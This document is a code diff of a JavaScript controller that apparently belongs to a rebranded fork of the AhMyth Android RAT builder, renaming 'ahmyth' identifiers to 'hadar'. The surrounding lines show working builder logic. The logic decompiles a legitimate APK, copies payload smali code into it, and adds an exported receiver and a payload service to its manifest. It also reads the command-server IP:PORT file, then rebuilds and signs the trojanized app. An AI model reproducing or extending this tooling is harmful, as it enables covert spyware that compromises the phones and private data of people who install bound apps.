@@ -256,7 +256,7 @@ app.controller("AppCtrl", ($scope) => {
 
             try {
                 delayedLog('[★] Reading the Payload Manifest File...');
-                const data = await fs.promises.readFile(dir.join(CONSTANTS.ahmythApkFolderPath, 'AndroidManifest.xml'), 'utf8');
+                const data = await fs.promises.readFile(dir.join(CONSTANTS.hadarApkFolderPath, 'AndroidManifest.xml'), 'utf8');
 
                 delayedLog('[★] Parsing the Payload Manifest Data...');
                 const parsedData = await new Promise((resolve, reject) => {
@@ -304,7 +304,7 @@ app.controller("AppCtrl", ($scope) => {
                 const builder = new xml2js.Builder();
                 const updatedData = builder.buildObject(parsedData);
                 await fs.promises.writeFile(
-                    dir.join(CONSTANTS.ahmythApkFolderPath,
+                    dir.join(CONSTANTS.hadarApkFolderPath,
                         'AndroidManifest.xml'),
                     updatedData,
                     'utf8'
@@ -365,7 +365,7 @@ app.controller("AppCtrl", ($scope) => {
                         delayedLog('[¡] ' + dir.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.INFO);
                         delayedLog();
 
-                        fs.copyFile(dir.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), dir.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
+                        fs.copyFile(dir.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), dir.join(CONSTANTS.hadarApkFolderPath, "AndroidManifest.xml"), (err) => {
                             if (err) throw err;
                         });
                     });
@@ -405,7 +405,7 @@ app.controller("AppCtrl", ($scope) => {
 
     // function to copy payload source files to the original app
     // and if success go to generate the apk
-    $appCtrl.copyAhmythFilesAndGenerateApk = (apkFolder) => {
+    $appCtrl.copyPayloadFilesAndGenerateApk = (apkFolder) => {
 
         delayedLog('[★] Reading the Decompiled Original Application...')
         fs.readdir(apkFolder, {
@@ -432,7 +432,7 @@ app.controller("AppCtrl", ($scope) => {
                 }
 
                 delayedLog(`[★] Copying Payload Files to the ${payloadSmaliFolder} Directory...`);
-                fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"), targetPayloadFolder, {
+                fs.copy(dir.join(CONSTANTS.hadarApkFolderPath, "smali"), targetPayloadFolder, {
                     overwrite: true
                 }, (error) => {
                     if (error) {
@@ -654,7 +654,7 @@ app.controller("AppCtrl", ($scope) => {
                 $: {
                     'android:enabled': 'true',
                     'android:exported': 'true',
-                    'android:name': CONSTANTS.ahmythReceiver,
+                    'android:name': CONSTANTS.hadarReceiver,
                 },
                 'intent-filter': {
                     action: {
@@ -669,7 +669,7 @@ app.controller("AppCtrl", ($scope) => {
                 $: {
                     'android:enabled': 'true',
                     'android:exported': 'false',
-                    'android:name': CONSTANTS.ahmythService,
+                    'android:name': CONSTANTS.hadarService,
                 },
             };
 
@@ -738,7 +738,7 @@ app.controller("AppCtrl", ($scope) => {
                         return;
                     }
 
-                    $appCtrl.copyAhmythFilesAndGenerateApk(apkFolder)
+                    $appCtrl.copyPayloadFilesAndGenerateApk(apkFolder)
                 });
             });
         });
@@ -896,7 +896,7 @@ app.controller("AppCtrl", ($scope) => {
                                                             delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                                             return;
                                                         }
-                                                        $appCtrl.copyAhmythFilesAndGenerateApk(apkFolder);
+                                                        $appCtrl.copyPayloadFilesAndGenerateApk(apkFolder);
                                                     });
                                                 });
                                             });
@@ -935,7 +935,7 @@ app.controller("AppCtrl", ($scope) => {
 
                 // check if bind apk is enabled
                 if (!$appCtrl.bindApk.enable) {
-                    var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
+                    var ipPortFile = dir.join(CONSTANTS.hadarApkFolderPath, CONSTANTS.IOSocketPath);
                     delayedLog('[★] Reading (IP:PORT) File from ' + CONSTANTS.apkSourceName + dir.sep + CONSTANTS.IOSocketPath + '...');
                     fs.readFile(ipPortFile, 'utf8', (error, data) => {
                         if (error) {
@@ -959,7 +959,7 @@ app.controller("AppCtrl", ($scope) => {
                                 delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                 return;
                             }
-                            $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);
+                            $appCtrl.GenerateApk(CONSTANTS.hadarApkFolderPath);
                         });
                     });
                 } else {
@@ -973,7 +973,7 @@ app.controller("AppCtrl", ($scope) => {
                         return;
                     }
 
-                    var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
+                    var ipPortFile = dir.join(CONSTANTS.hadarApkFolderPath, CONSTANTS.IOSocketPath);
                     delayedLog('[★] Reading (IP:PORT) File from ' + CONSTANTS.apkSourceName + dir.sep + CONSTANTS.IOSocketPath + '...');
                     fs.readFile(ipPortFile, 'utf8', (error, data) => {
                         if (error) {
@@ -998,7 +998,7 @@ app.controller("AppCtrl", ($scope) => {
                                 return;
                             }
 
-                            // generate a solid ahmyth apk
+                            // generate a solid hadar apk
                             var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
                             delayedLog('[★] ' + 'Decompiling ' + '"' + filePath.replace(/\\/g, "/").split("/").pop() + '"' + "...");
 
